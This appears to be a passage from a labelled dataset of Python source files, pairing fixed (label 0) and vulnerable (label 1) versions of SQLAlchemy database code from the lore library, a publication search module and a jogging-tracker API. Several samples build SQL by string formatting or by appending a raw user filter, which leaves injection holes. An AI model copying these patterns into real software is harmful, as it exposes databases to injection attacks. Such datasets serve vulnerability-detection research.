        with timer('check requirements', logging.DEBUG):
            install_missing = env.name in [env.DEVELOPMENT, env.TEST]
            env.check_requirements(install_missing)
        
    try:
        with timer('numpy init', logging.DEBUG):
            import numpy
        
            numpy.random.seed(1)
            logger.debug('numpy.random.seed(1)')
    except ModuleNotFoundError as e:
        pass

    try:
        with timer('rollbar init', logging.DEBUG):
            import rollbar
            rollbar.init(
                os.environ.get(""ROLLBAR_ACCESS_TOKEN"", None),
                allow_logging_basic_config=False,
                environment=env.name,
                enabled=(env.name != env.DEVELOPMENT),
                handler='blocking',
                locals={""enabled"": True})
    
            def report_error(exc_type, value, tb):
                import traceback
                logger.critical('Exception: %s' % ''.join(
                    traceback.format_exception(exc_type, value, tb)))
                if hasattr(sys, 'ps1'):
                    print(''.join(traceback.format_exception(exc_type, value, tb)))
                else:
                    rollbar.report_exc_info((exc_type, value, tb))
            sys.excepthook = report_error

    except ModuleNotFoundError as e:
        def report_error(exc_type, value, tb):
            import traceback
            logger.critical('Exception: %s' % ''.join(
                traceback.format_exception(exc_type, value, tb)))
            
        sys.excepthook = report_error
        pass
/n/n/nlore/io/connection.py/n/nimport hashlib
import inspect
import logging
import os
import re
import sys
import tempfile
import csv
import gzip
from datetime import datetime
from time import time
from io import StringIO
from sqlalchemy import event
from sqlalchemy.engine import Engine
from sqlalchemy.schema import DropTable
from sqlalchemy.ext.compiler import compiles

import pandas
import sqlalchemy

import lore
from lore.util import timer
from lore.stores import query_cached


logger = logging.getLogger(__name__)


@compiles(DropTable, 'postgresql')
def _compile_drop_table(element, compiler, **kwargs):
    return compiler.visit_drop_table(element) + ' CASCADE'


class Connection(object):
    UNLOAD_PREFIX = os.path.join(lore.env.name, 'unloads')
    IAM_ROLE = os.environ.get('IAM_ROLE', None)
    
    def __init__(self, url, **kwargs):
        for int_value in ['pool_size', 'pool_recycle', 'max_overflow']:
            if int_value in kwargs:
                kwargs[int_value] = int(kwargs[int_value])
        if 'poolclass' in kwargs:
            kwargs['poolclass'] = getattr(sqlalchemy.pool, kwargs['poolclass'])
        if '__name__' in kwargs:
            del kwargs['__name__']
        self._engine = sqlalchemy.create_engine(url, **kwargs)
        self._connection = None
        self._metadata = None
        self._transactions = []
    
    def __enter__(self):
        if self._connection is None:
            self._connection = self._engine.connect()
        self._transactions.append(self._connection.begin())
        return self
    
    def __exit__(self, type, value, traceback):
        transaction = self._transactions.pop()
        if type is None:
            transaction.commit()
        else:
            transaction.rollback()

    @staticmethod
    def path(filename, extension='.sql'):
        return os.path.join(
            lore.env.root, lore.env.project, 'extracts',
            filename + extension)

    def execute(self, sql=None, filename=None, **kwargs):
        self.__execute(self.__prepare(sql, filename), kwargs)

    def insert(self, table, dataframe, batch_size=None):
        if batch_size is None:
            batch_size = len(dataframe)

        if self._connection is None:
            self._connection = self._engine.connect()

        dataframe.to_sql(
            table,
            self._connection,
            if_exists='append',
            index=False,
            chunksize=batch_size
        )

    def replace(self, table, dataframe, batch_size=None):
        import migrate.changeset
        global _after_replace_callbacks
        
        with timer('REPLACE ' + table):
            suffix = datetime.now().strftime('_%Y%m%d%H%M%S').encode('utf-8')
            self.metadata
            temp = 'tmp_'.encode('utf-8')
            source = sqlalchemy.Table(table, self.metadata, autoload=True, autoload_with=self._engine)
            destination_name = 'tmp_' + hashlib.sha256(temp + table.encode('utf-8') + suffix).hexdigest()[0:56]
            destination = sqlalchemy.Table(destination_name, self.metadata, autoload=False)
            for column in source.columns:
                destination.append_column(column.copy())
            destination.create()

            original_names = {}
            for index in source.indexes:
                # make sure the name is < 63 chars with the suffix
                name = hashlib.sha256(temp + index.name.encode('utf-8') + suffix).hexdigest()[0:60]
                original_names[name] = index.name
                columns = []
                for column in index.columns:
                    columns.append(next(x for x in destination.columns if x.name == column.name))
                new = sqlalchemy.Index(name, *columns)
                new.unique = index.unique
                new.table = destination
                new.create(bind=self._connection)
            self.insert(destination.name, dataframe, batch_size=batch_size)
            self.execute(""BEGIN; SET LOCAL statement_timeout = '1min'; ANALYZE %s; COMMIT;"" % self.quote_identifier(table))

            with self as transaction:
                backup = sqlalchemy.Table(table + '_b', self.metadata)
                backup.drop(bind=self._connection, checkfirst=True)
                source.rename(name=source.name + '_b', connection=self._connection)
                destination.rename(name=table, connection=self._connection)
                for index in source.indexes:
                    index.rename(index.name[0:-2] + '_b', connection=self._connection)
                for index in destination.indexes:
                    index.rename(original_names[index.name], connection=self._connection)
        
        for func in _after_replace_callbacks:
            func(destination, source)
        
    @property
    def metadata(self):
        if not self._metadata:
            self._metadata = sqlalchemy.MetaData(bind=self._engine)

        return self._metadata

    def select(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        return self._select(sql, kwargs, cache=cache)

    @query_cached
    def _select(self, sql, bindings):
        return self.__execute(sql, bindings).fetchall()

    def unload(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        return self._unload(sql, kwargs, cache=cache)
    
    @query_cached
    def _unload(self, sql, bindings):
        key = hashlib.sha1(str(sql).encode('utf-8')).hexdigest()

        match = re.match(r'.*?select\s(.*)from.*', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)
        if match:
            columns = []
            nested = 0
            potential = match[1].split(',')
            for column in potential:
                nested += column.count('(')
                nested -= column.count(')')
                if nested == 0:
                    columns.append(column.split()[-1].split('.')[-1].strip())
                elif column == potential[-1]:
                    column = re.split('from', column, flags=re.IGNORECASE)[0].strip()
                    columns.append(column.split()[-1].split('.')[-1].strip())
        else:
            columns = []
        logger.warning(""Redshift unload requires poorly parsing column names from sql, found: {}"".format(columns))

        sql = ""UNLOAD ('"" + sql.replace('\\', '\\\\').replace(""'"", ""\\'"") + ""') ""
        sql += ""TO 's3://"" + os.path.join(
            lore.io.bucket.name,
            self.UNLOAD_PREFIX,
            key,
            ''
        ) + ""' ""
        if Connection.IAM_ROLE:
            sql += ""IAM_ROLE '"" + Connection.IAM_ROLE + ""' ""
        sql += ""DELIMITER '|' ADDQUOTES GZIP ALLOWOVERWRITE""
        if re.match(r'(.*?)(limit\s+\d+)(.*)', sql, re.IGNORECASE | re.UNICODE | re.DOTALL):
            logger.warning('LIMIT clause is not supported by unload, returning full set.')
            sql = re.sub(r'(.*?)(limit\s+\d+)(.*)', r'\1\3', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)
        self.__execute(sql, bindings)
        return key, columns

    @query_cached
    def load(self, key, columns):
        result = [columns]
        with timer('load:'):
            for entry in lore.io.bucket.objects.filter(
                Prefix=os.path.join(self.UNLOAD_PREFIX, key)
            ):
                temp = tempfile.NamedTemporaryFile()
                lore.io.bucket.download_file(entry.key, temp.name)
                with gzip.open(temp.name, 'rt') as gz:
                    result += list(csv.reader(gz, delimiter='|', quotechar='""'))
        
            return result
    
    @query_cached
    def load_dataframe(self, key, columns):
        with timer('load_dataframe:'):
            frames = []
            for entry in lore.io.bucket.objects.filter(
                Prefix=os.path.join(self.UNLOAD_PREFIX, key)
            ):
                temp = tempfile.NamedTemporaryFile()
                lore.io.bucket.download_file(entry.key, temp.name)
                dataframe = pandas.read_csv(
                    temp.name,
                    delimiter='|',
                    quotechar='""',
                    compression='gzip',
                    error_bad_lines=False
                )
                dataframe.columns = columns
                frames.append(dataframe)

            result = pandas.concat(frames)
            result.columns = columns
            buffer = StringIO()
            result.info(buf=buffer, memory_usage='deep')
            logger.info(buffer.getvalue())
            logger.info(result.head())
            return result
        
    def dataframe(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        dataframe = self._dataframe(sql, kwargs, cache=cache)
        buffer = StringIO()
        dataframe.info(buf=buffer, memory_usage='deep')
        logger.info(buffer.getvalue())
        logger.info(dataframe.head())
        return dataframe
        
    @query_cached
    def _dataframe(self, sql, bindings):
        with timer(""dataframe:""):
            if self._connection is None:
                self._connection = self._engine.connect()
            dataframe = pandas.read_sql(sql=sql, con=self._connection, params=bindings)
            return dataframe

    def quote_identifier(self, identifier):
        return self._engine.dialect.identifier_preparer.quote(identifier)
        

    def __prepare(self, sql, filename):
        if sql is None and filename is not None:
            filename = Connection.path(filename, '.sql')
            logger.debug(""READ SQL FILE: "" + filename)
            with open(filename) as file:
                sql = file.read()
        # support mustache style bindings
        sql = re.sub(r'\{(\w+?)\}', r'%(\1)s', sql)
        return sql

    def __execute(self, sql, bindings):
        if self._connection is None:
            self._connection = self._engine.connect()
        return self._connection.execute(sql, bindings)


@event.listens_for(Engine, ""before_cursor_execute"", retval=True)
def comment_sql_calls(conn, cursor, statement, parameters, context, executemany):
    conn.info.setdefault('query_start_time', []).append(datetime.now())

    stack = inspect.stack()[1:-1]
    if sys.version_info.major == 3:
        stack = [(x.filename, x.lineno, x.function) for x in stack]
    else:
        stack = [(x[1], x[2], x[3]) for x in stack]

    paths = [x[0] for x in stack]
    origin = next((x for x in paths if lore.env.project in x), None)
    if origin is None:
        origin = next((x for x in paths if 'sqlalchemy' not in x), None)
    if origin is None:
        origin = paths[0]
    caller = next(x for x in stack if x[0] == origin)

    statement = ""/* %s | %s:%d in %s */\n"" % (lore.env.project, caller[0], caller[1], caller[2]) + statement
    logger.debug(statement)
    return statement, parameters


@event.listens_for(Engine, ""after_cursor_execute"")
def time_sql_calls(conn, cursor, statement, parameters, context, executemany):
    total = datetime.now() - conn.info['query_start_time'].pop(-1)
    logger.info(""SQL: %s"" % total)


_after_replace_callbacks = []
def after_replace(func):
    global _after_replace_callbacks
    _after_replace_callbacks.append(func)
/n/n/n",0
15,15,a0a5fd945a8bf128d4b9fb6a3ebc6306f82fa4d0,"/lore/__init__.py/n/n# -*- coding: utf-8 -*-
from __future__ import absolute_import

import logging
import os
import sys
import atexit

from lore import env, util, ansi
from lore.ansi import underline
from lore.util import timer

logger = logging.getLogger(__name__)

if not (sys.version_info.major == 3 and sys.version_info.minor >= 6):
    ModuleNotFoundError = ImportError


__author__ = 'Montana Low and Jeremy Stanley'
__copyright__ = 'Copyright © 2017, Instacart'
__credits__ = ['Montana Low', 'Jeremy Stanley', 'Emmanuel Turlay']
__license__ = 'MIT'
__version__ = '0.4.45'
__maintainer__ = 'Montana Low'
__email__ = 'montana@instacart.com'
__status__ = 'Development Status :: 3 - Alpha'


def banner():
    import socket
    import getpass
    
    return '%s in %s on %s' % (
        ansi.foreground(ansi.GREEN, env.project),
        ansi.foreground(env.color, env.name),
        ansi.foreground(ansi.CYAN,
                        getpass.getuser() + '@' + socket.gethostname())
    )


lore_no_env = False
if hasattr(sys, 'lore_no_env'):
    lore_no_env = sys.lore_no_env

if len(sys.argv) > 1 and sys.argv[0][-4:] == 'lore' and sys.argv[1] in ['install', 'init']:
    lore_no_env = True

if not lore_no_env:
    # everyone else gets validated and launched on import
    env.validate()
    env.launch()

if env.launched():
    print(banner())
    logger.info(banner())
    logger.debug('python environment: %s' % env.prefix)

    if not lore_no_env:
        with timer('check requirements', logging.DEBUG):
            install_missing = env.name in [env.DEVELOPMENT, env.TEST]
            env.check_requirements(install_missing)
        
    try:
        with timer('numpy init', logging.DEBUG):
            import numpy
        
            numpy.random.seed(1)
            logger.debug('numpy.random.seed(1)')
    except ModuleNotFoundError as e:
        pass

    try:
        with timer('rollbar init', logging.DEBUG):
            import rollbar
            rollbar.init(
                os.environ.get(""ROLLBAR_ACCESS_TOKEN"", None),
                allow_logging_basic_config=False,
                environment=env.name,
                enabled=(env.name != env.DEVELOPMENT),
                handler='blocking',
                locals={""enabled"": True})
    
            def report_error(exc_type, value, tb):
                import traceback
                logger.critical('Exception: %s' % ''.join(
                    traceback.format_exception(exc_type, value, tb)))
                if hasattr(sys, 'ps1'):
                    print(''.join(traceback.format_exception(exc_type, value, tb)))
                else:
                    rollbar.report_exc_info((exc_type, value, tb))
            sys.excepthook = report_error

    except ModuleNotFoundError as e:
        def report_error(exc_type, value, tb):
            import traceback
            logger.critical('Exception: %s' % ''.join(
                traceback.format_exception(exc_type, value, tb)))
            
        sys.excepthook = report_error
        pass
/n/n/n/lore/io/connection.py/n/nimport hashlib
import inspect
import logging
import os
import re
import sys
import tempfile
import csv
import gzip
from datetime import datetime
from time import time
from io import StringIO
from sqlalchemy import event
from sqlalchemy.engine import Engine
from sqlalchemy.schema import DropTable
from sqlalchemy.ext.compiler import compiles

import pandas
import sqlalchemy

import lore
from lore.util import timer
from lore.stores import query_cached


logger = logging.getLogger(__name__)


@compiles(DropTable, 'postgresql')
def _compile_drop_table(element, compiler, **kwargs):
    return compiler.visit_drop_table(element) + ' CASCADE'


class Connection(object):
    UNLOAD_PREFIX = os.path.join(lore.env.name, 'unloads')
    IAM_ROLE = os.environ.get('IAM_ROLE', None)
    
    def __init__(self, url, **kwargs):
        for int_value in ['pool_size', 'pool_recycle', 'max_overflow']:
            if int_value in kwargs:
                kwargs[int_value] = int(kwargs[int_value])
        if 'poolclass' in kwargs:
            kwargs['poolclass'] = getattr(sqlalchemy.pool, kwargs['poolclass'])
        if '__name__' in kwargs:
            del kwargs['__name__']
        self._engine = sqlalchemy.create_engine(url, **kwargs)
        self._connection = None
        self._metadata = None
        self._transactions = []
    
    def __enter__(self):
        if self._connection is None:
            self._connection = self._engine.connect()
        self._transactions.append(self._connection.begin())
        return self
    
    def __exit__(self, type, value, traceback):
        transaction = self._transactions.pop()
        if type is None:
            transaction.commit()
        else:
            transaction.rollback()

    @staticmethod
    def path(filename, extension='.sql'):
        return os.path.join(
            lore.env.root, lore.env.project, 'extracts',
            filename + extension)

    def execute(self, sql=None, filename=None, **kwargs):
        self.__execute(self.__prepare(sql, filename), kwargs)

    def insert(self, table, dataframe, batch_size=None):
        if batch_size is None:
            batch_size = len(dataframe)

        if self._connection is None:
            self._connection = self._engine.connect()

        dataframe.to_sql(
            table,
            self._connection,
            if_exists='append',
            index=False,
            chunksize=batch_size
        )

    def replace(self, table, dataframe, batch_size=None):
        import migrate.changeset
        global _after_replace_callbacks
        
        with timer('REPLACE ' + table):
            suffix = datetime.now().strftime('_%Y%m%d%H%M%S').encode('utf-8')
            self.metadata
            temp = 'tmp_'.encode('utf-8')
            source = sqlalchemy.Table(table, self.metadata, autoload=True, autoload_with=self._engine)
            destination_name = 'tmp_' + hashlib.sha256(temp + table.encode('utf-8') + suffix).hexdigest()[0:56]
            destination = sqlalchemy.Table(destination_name, self.metadata, autoload=False)
            for column in source.columns:
                destination.append_column(column.copy())
            destination.create()

            original_names = {}
            for index in source.indexes:
                # make sure the name is < 63 chars with the suffix
                name = hashlib.sha256(temp + index.name.encode('utf-8') + suffix).hexdigest()[0:60]
                original_names[name] = index.name
                columns = []
                for column in index.columns:
                    columns.append(next(x for x in destination.columns if x.name == column.name))
                new = sqlalchemy.Index(name, *columns)
                new.unique = index.unique
                new.table = destination
                new.create(bind=self._connection)
            self.insert(destination.name, dataframe, batch_size=batch_size)
            self.execute(""BEGIN; SET LOCAL statement_timeout = '1min'; ANALYZE %s; COMMIT;"" % table)

            with self as transaction:
                backup = sqlalchemy.Table(table + '_b', self.metadata)
                backup.drop(bind=self._connection, checkfirst=True)
                source.rename(name=source.name + '_b', connection=self._connection)
                destination.rename(name=table, connection=self._connection)
                for index in source.indexes:
                    index.rename(index.name[0:-2] + '_b', connection=self._connection)
                for index in destination.indexes:
                    index.rename(original_names[index.name], connection=self._connection)
        
        for func in _after_replace_callbacks:
            func(destination, source)
        
    @property
    def metadata(self):
        if not self._metadata:
            self._metadata = sqlalchemy.MetaData(bind=self._engine)

        return self._metadata

    def select(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        return self._select(sql, kwargs, cache=cache)

    @query_cached
    def _select(self, sql, bindings):
        return self.__execute(sql, bindings).fetchall()

    def unload(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        return self._unload(sql, kwargs, cache=cache)
    
    @query_cached
    def _unload(self, sql, bindings):
        key = hashlib.sha1(str(sql).encode('utf-8')).hexdigest()

        match = re.match(r'.*?select\s(.*)from.*', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)
        if match:
            columns = []
            nested = 0
            potential = match[1].split(',')
            for column in potential:
                nested += column.count('(')
                nested -= column.count(')')
                if nested == 0:
                    columns.append(column.split()[-1].split('.')[-1].strip())
                elif column == potential[-1]:
                    column = re.split('from', column, flags=re.IGNORECASE)[0].strip()
                    columns.append(column.split()[-1].split('.')[-1].strip())
        else:
            columns = []
        logger.warning(""Redshift unload requires poorly parsing column names from sql, found: {}"".format(columns))

        sql = ""UNLOAD ('"" + sql.replace('\\', '\\\\').replace(""'"", ""\\'"") + ""') ""
        sql += ""TO 's3://"" + os.path.join(
            lore.io.bucket.name,
            self.UNLOAD_PREFIX,
            key,
            ''
        ) + ""' ""
        if Connection.IAM_ROLE:
            sql += ""IAM_ROLE '"" + Connection.IAM_ROLE + ""' ""
        sql += ""DELIMITER '|' ADDQUOTES GZIP ALLOWOVERWRITE""
        if re.match(r'(.*?)(limit\s+\d+)(.*)', sql, re.IGNORECASE | re.UNICODE | re.DOTALL):
            logger.warning('LIMIT clause is not supported by unload, returning full set.')
            sql = re.sub(r'(.*?)(limit\s+\d+)(.*)', r'\1\3', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)
        self.__execute(sql, bindings)
        return key, columns

    @query_cached
    def load(self, key, columns):
        result = [columns]
        with timer('load:'):
            for entry in lore.io.bucket.objects.filter(
                Prefix=os.path.join(self.UNLOAD_PREFIX, key)
            ):
                temp = tempfile.NamedTemporaryFile()
                lore.io.bucket.download_file(entry.key, temp.name)
                with gzip.open(temp.name, 'rt') as gz:
                    result += list(csv.reader(gz, delimiter='|', quotechar='""'))
        
            return result
    
    @query_cached
    def load_dataframe(self, key, columns):
        with timer('load_dataframe:'):
            frames = []
            for entry in lore.io.bucket.objects.filter(
                Prefix=os.path.join(self.UNLOAD_PREFIX, key)
            ):
                temp = tempfile.NamedTemporaryFile()
                lore.io.bucket.download_file(entry.key, temp.name)
                dataframe = pandas.read_csv(
                    temp.name,
                    delimiter='|',
                    quotechar='""',
                    compression='gzip',
                    error_bad_lines=False
                )
                dataframe.columns = columns
                frames.append(dataframe)

            result = pandas.concat(frames)
            result.columns = columns
            buffer = StringIO()
            result.info(buf=buffer, memory_usage='deep')
            logger.info(buffer.getvalue())
            logger.info(result.head())
            return result
        
    def dataframe(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        dataframe = self._dataframe(sql, kwargs, cache=cache)
        buffer = StringIO()
        dataframe.info(buf=buffer, memory_usage='deep')
        logger.info(buffer.getvalue())
        logger.info(dataframe.head())
        return dataframe
        
    @query_cached
    def _dataframe(self, sql, bindings):
        with timer(""dataframe:""):
            if self._connection is None:
                self._connection = self._engine.connect()
            dataframe = pandas.read_sql(sql=sql, con=self._connection, params=bindings)
            return dataframe

    def quote_identifier(self, identifier):
        return self._engine.dialect.identifier_preparer.quote(identifier)
        

    def __prepare(self, sql, filename):
        if sql is None and filename is not None:
            filename = Connection.path(filename, '.sql')
            logger.debug(""READ SQL FILE: "" + filename)
            with open(filename) as file:
                sql = file.read()
        # support mustache style bindings
        sql = re.sub(r'\{(\w+?)\}', r'%(\1)s', sql)
        return sql

    def __execute(self, sql, bindings):
        if self._connection is None:
            self._connection = self._engine.connect()
        return self._connection.execute(sql, bindings)


@event.listens_for(Engine, ""before_cursor_execute"", retval=True)
def comment_sql_calls(conn, cursor, statement, parameters, context, executemany):
    conn.info.setdefault('query_start_time', []).append(datetime.now())

    stack = inspect.stack()[1:-1]
    if sys.version_info.major == 3:
        stack = [(x.filename, x.lineno, x.function) for x in stack]
    else:
        stack = [(x[1], x[2], x[3]) for x in stack]

    paths = [x[0] for x in stack]
    origin = next((x for x in paths if lore.env.project in x), None)
    if origin is None:
        origin = next((x for x in paths if 'sqlalchemy' not in x), None)
    if origin is None:
        origin = paths[0]
    caller = next(x for x in stack if x[0] == origin)

    statement = ""/* %s | %s:%d in %s */\n"" % (lore.env.project, caller[0], caller[1], caller[2]) + statement
    logger.debug(statement)
    return statement, parameters


@event.listens_for(Engine, ""after_cursor_execute"")
def time_sql_calls(conn, cursor, statement, parameters, context, executemany):
    total = datetime.now() - conn.info['query_start_time'].pop(-1)
    logger.info(""SQL: %s"" % total)


_after_replace_callbacks = []
def after_replace(func):
    global _after_replace_callbacks
    _after_replace_callbacks.append(func)
/n/n/n",1
186,186,4cde28ea869c921be917cd8726edb958b37d683a,"search.py/n/nfrom sqlalchemy import sql

from app import db
from pub import Pub


def fulltext_search_title(query):
    query_statement = sql.text(""""""
      SELECT id, ts_headline('english', title, query), ts_rank_cd(to_tsvector('english', title), query, 32) AS rank
        FROM pub_2018, plainto_tsquery('english', :search_str) query  -- or try plainto_tsquery, phraseto_tsquery, to_tsquery
        WHERE to_tsvector('english', title) @@ query
        ORDER BY rank DESC
        LIMIT 50;"""""")

    rows = db.engine.execute(query_statement.bindparams(search_str=query)).fetchall()
    ids = [row[0] for row in rows]
    my_pubs = db.session.query(Pub).filter(Pub.id.in_(ids)).all()
    for row in rows:
        my_id = row[0]
        for my_pub in my_pubs:
            if my_id == my_pub.id:
                my_pub.snippet = row[1]
                my_pub.score = row[2]
    return my_pubs


def autocomplete_phrases(query):
    query_statement = sql.text(ur""""""
        with s as (SELECT id, lower(title) as lower_title FROM pub_2018 WHERE title iLIKE :p0)
        select match, count(*) as score from (
            SELECT regexp_matches(lower_title, :p1, 'g') as match FROM s
            union all
            SELECT regexp_matches(lower_title, :p2, 'g') as match FROM s
            union all
            SELECT regexp_matches(lower_title, :p3, 'g') as match FROM s
            union all
            SELECT regexp_matches(lower_title, :p4, 'g') as match FROM s
        ) s_all
        group by match
        order by score desc, length(match::text) asc
        LIMIT 50;"""""").bindparams(
            p0='%{}%'.format(query),
            p1=ur'({}\w*?\M)'.format(query),
            p2=ur'({}\w*?(?:\s+\w+){{1}})\M'.format(query),
            p3=ur'({}\w*?(?:\s+\w+){{2}})\M'.format(query),
            p4=ur'({}\w*?(?:\s+\w+){{3}}|)\M'.format(query)
        )

    rows = db.engine.execute(query_statement).fetchall()
    phrases = [{""phrase"":row[0][0], ""score"":row[1]} for row in rows if row[0][0]]
    return phrases/n/n/n",0
187,187,4cde28ea869c921be917cd8726edb958b37d683a,"/search.py/n/nfrom sqlalchemy import sql

from app import db
from pub import Pub

def fulltext_search_title(query):
    query_string = """"""
      SELECT id, ts_headline('english', title, query), ts_rank_cd(to_tsvector('english', title), query, 32) AS rank
        FROM pub_2018, plainto_tsquery('english', '{}') query  -- or try plainto_tsquery, phraseto_tsquery, to_tsquery
        WHERE to_tsvector('english', title) @@ query
        ORDER BY rank DESC
        LIMIT 50;"""""".format(query)

    rows = db.engine.execute(sql.text(query_string)).fetchall()
    ids = [row[0] for row in rows]
    my_pubs = db.session.query(Pub).filter(Pub.id.in_(ids)).all()
    for row in rows:
        my_id = row[0]
        for my_pub in my_pubs:
            if my_id == my_pub.id:
                my_pub.snippet = row[1]
                my_pub.score = row[2]
    return my_pubs

def autocomplete_phrases(query):
    query_string = ur""""""
        with s as (SELECT id, lower(title) as lower_title FROM pub_2018 WHERE title iLIKE '%{query}%')
        select match, count(*) as score from (
            SELECT regexp_matches(lower_title, '({query}\w*?\M)', 'g') as match FROM s
            union all
            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{1}})\M', 'g') as match FROM s
            union all
            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{2}})\M', 'g') as match FROM s
            union all
            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{3}}|)\M', 'g') as match FROM s
        ) s_all
        group by match
        order by score desc, length(match::text) asc
        LIMIT 50;"""""".format(query=query)

    rows = db.engine.execute(sql.text(query_string)).fetchall()
    phrases = [{""phrase"":row[0][0], ""score"":row[1]} for row in rows if row[0][0]]
    return phrases/n/n/n",1
50,50,6479565faf37bc48eed36fed46f7e8ee377f1d1e,"Models/jogging_result.py/n/nimport json
from sqlalchemy.sql import text
from sqlalchemy.exc import OperationalError
from .dbhelper import engine


class JoggingResult(object):
    def __init__(
        self, user_id, location, date, distance, time, condition
    ):
        self.user_id = user_id
        self.location = location
        self.date = date
        self.distance = distance
        self.time = time
        self.condition = condition

    def __dict__(self):
        return {
            ""location"": self.location,
            ""date"": self.date,
            ""distance"": self.distance,
            ""time"": self.time,
            ""condition"": json.loads(self.condition),
        }

    def save(self):
        connection = engine.connect()
        trans = connection.begin()
        try:
            s = text(
                ""INSERT INTO jogging_results(user_id, location, date, running_distance, time, condition) ""
                ""VALUES(:user_id, :location, :date, :running_distance, :time, :condition)""
            )
            connection.execute(
                s,
                user_id=self.user_id,
                location=self.location,
                date=self.date,
                running_distance=self.distance,
                time=self.time,
                condition=self.condition,
            )
            trans.commit()
        except:
            trans.rollback()
            raise
        connection.close()

    @classmethod
    def load(
        cls, user_id: int, q_filter: str, page: int, limit: int
    ) -> list:
        assert engine
        s = (
            ""SELECT location, date, running_distance, time, condition ""
            ""FROM jogging_results ""
            ""WHERE user_id = :user_id""
        )

        if q_filter:
            q_filter = (
                q_filter.replace(""eq"", ""="")
                .replace(""ne"", ""!="")
                .replace(""gt"", "">="")
                .replace(""lt"", ""<="")
                .replace(""distance"", ""running_distance"")
                .replace("";"", """")
            )
            s += f"" AND ({q_filter})""

        s += "" ORDER BY date(date) LIMIT :limit OFFSET :page""

        connection = engine.connect()
        try:
            q_result = connection.execute(
                text(s), user_id=user_id, limit=limit, page=page
            ).fetchall()
        except OperationalError as e:
            raise (e)

        rc = (
            [
                JoggingResult(
                    user_id, row[0], row[1], row[2], row[3], row[4]
                ).__dict__()
                for row in q_result
            ]
            if q_result is not None
            else []
        )
        connection.close()
        return rc
/n/n/nModels/user.py/n/nfrom sqlalchemy.sql import text
from .dbhelper import engine


class User(object):
    def __init__(
        self,
        user_id,
        username,
        hashed_password,
        roll_id=1,
        *args,
        **kwargs
    ):
        self.user_id = user_id
        self.username = username
        self.hashed_password = hashed_password
        self.roll_id = roll_id

    def to_dict(self):
        return {""user_id"": self.user_id, ""username"": self.username}

    def save(self):
        connection = engine.connect()
        trans = connection.begin()
        try:
            s = text(
                ""INSERT INTO users(username, hashed_password, roll_id) ""
                ""VALUES(:username, :hashed_password, :roll_id)""
            )
            connection.execute(
                s,
                username=self.username,
                hashed_password=self.hashed_password,
                roll_id=self.roll_id,
            )
            trans.commit()
        except:
            trans.rollback()
            raise
        connection.close()

    @classmethod
    def get_by_username(cls, username):
        assert engine
        s = text(
            ""SELECT user_id, username, hashed_password, roll_id ""
            ""FROM users ""
            ""WHERE username = :username AND expire_date is null""
        )
        connection = engine.connect()
        rc = connection.execute(s, username=username).fetchone()
        if rc is not None:
            rc = User(rc[0], rc[1], rc[2].decode(""utf-8""), rc[3])

        connection.close()
        return rc

    @classmethod
    def username_exists(cls, username):
        assert engine
        s = text(
            ""SELECT * ""
            ""FROM users ""
            ""WHERE username = :username AND expire_date is null""
        )
        connection = engine.connect()

        rc = (
            False
            if connection.execute(s, username=username).fetchone()
            is None
            else True
        )
        connection.close()
        return rc
/n/n/nRoutes/jogging_results.py/n/nimport datetime
import json
from sanic import response
from sanic.exceptions import SanicException, InvalidUsage, add_status_code
from sanic_jwt.decorators import protected
from jogging.Contectors.darksky import get_weather_condition
from jogging.Routes.auth import retrieve_user
from jogging.Models.jogging_result import JoggingResult


@add_status_code(409)
class Conflict(SanicException):
    pass


@protected()
async def add_jogging_result(request, *args, **kwargs):
    if (
        request.json is None
        or ""date"" not in request.json
        or ""distance"" not in request.json
        or ""time"" not in request.json
        or ""location"" not in request.json
    ):
        raise InvalidUsage(
            ""invalid payload (should be {date, distance, time, location})""
        )

    distance = request.json[""distance""]
    if distance <= 0:
        raise InvalidUsage(""distance needs to be positive"")

    try:
        date = datetime.datetime.strptime(
            request.json[""date""], ""%Y-%m-%d""
        ).date()
    except ValueError:
        raise InvalidUsage(""invalid date (should be 'YYYY-MM-DD')"")

    latlong = request.json[""location""].split("" "")

    if len(latlong) != 2:
        raise InvalidUsage(""invalid location (should be 'LAT LONG')"")

    try:
        lat = float(latlong[0])
        long = float(latlong[1])
    except ValueError:
        raise InvalidUsage(
            ""invalid location (lat & long should be floating-point)""
        )

    if not (-90.0 <= lat <= 90.0 and -180 <= long <= 180):
        raise InvalidUsage(
            ""invalid location (The latitude must be a number between -90 and 90 and the longitude between -180 and 180)""
        )

    try:
        time = int(request.json[""time""])
    except ValueError:
        raise InvalidUsage(""invalid time (time should be an integer)"")

    if time <= 0:
        raise InvalidUsage(""invalid time (time should be positive)"")

    condition = await get_weather_condition(lat, long, date)

    if condition is None:
        raise InvalidUsage(
            ""can't fetch running conditions for that location & time""
        )

    user_id = retrieve_user(request, args, kwargs)[""user_id""]

    jog = JoggingResult(
        user_id,
        request.json[""location""],
        date,
        distance,
        time,
        json.dumps(condition[""data""][0]),
    )
    jog.save()

    return response.HTTPResponse(status=201)


@protected()
async def get_jogging_results(request, *args, **kwargs):
    page = int(request.args[""page""][0]) if ""page"" in request.args else 0
    limit = int(request.args[""count""][0]) if ""count"" in request.args else 10

    if page < 0 or limit <= 0:
        raise InvalidUsage(""invalid paging (page >= 0 and count > 0)"")

    q_filter = request.args[""filter""][0] if ""filter"" in request.args else None
    user_id = retrieve_user(request, args, kwargs)[""user_id""]

    try:
        rc = JoggingResult.load(user_id, q_filter, page, limit)
    except Exception as e:
        raise InvalidUsage(e)

    return response.json(rc, status=200)
/n/n/nTests/test_jogging_results.py/n/nimport pytest
from sanic import Sanic
import random
import json
from jogging.main import config_app
from jogging import config
